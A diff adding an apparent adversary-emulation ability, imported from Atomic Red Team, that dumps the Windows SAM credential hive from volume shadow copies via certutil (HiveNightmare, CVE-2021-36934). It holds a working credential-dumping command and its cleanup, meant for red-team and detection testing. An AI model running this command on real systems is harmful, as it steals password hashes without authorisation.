@@ -1,0 +1,42 @@
+- id: eeb9751a-d598-42d3-b11c-c122d9c3f6c7
+  name: dump volume shadow copy hives with certutil
+  description: 'Dump hives from volume shadow copies with the certutil utility, exploiting
+    a vulnerability known as "HiveNightmare" or "SeriousSAM".
+
+    This can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)'
+  tactic: credential-access
+  technique:
+    attack_id: T1003.002
+    name: 'OS Credential Dumping: Security Account Manager'
+  platforms:
+    windows:
+      sh:
+        command: for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"
+          %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*
+        cleanup: for /L %a in (1,1,#{limit}) do @(del %temp%\#{target_hive}vss%a >nul
+          2>&1)
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1003.002
+  - credential-access
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      target_hive:
+        description: Hive you wish to dump
+        type: string
+        default: SAM
+      limit:
+        description: Limit to the number of shadow copies to iterate through when
+          trying to copy the hive
+        type: integer
+        default: 10
+    technique_created: '2020-02-11T18:42:07.281Z'
+    atomic_guid: eeb9751a-d598-42d3-b11c-c122d9c3f6c7
+    import_timestamp: '2025-06-24T11:15:06.150179Z'
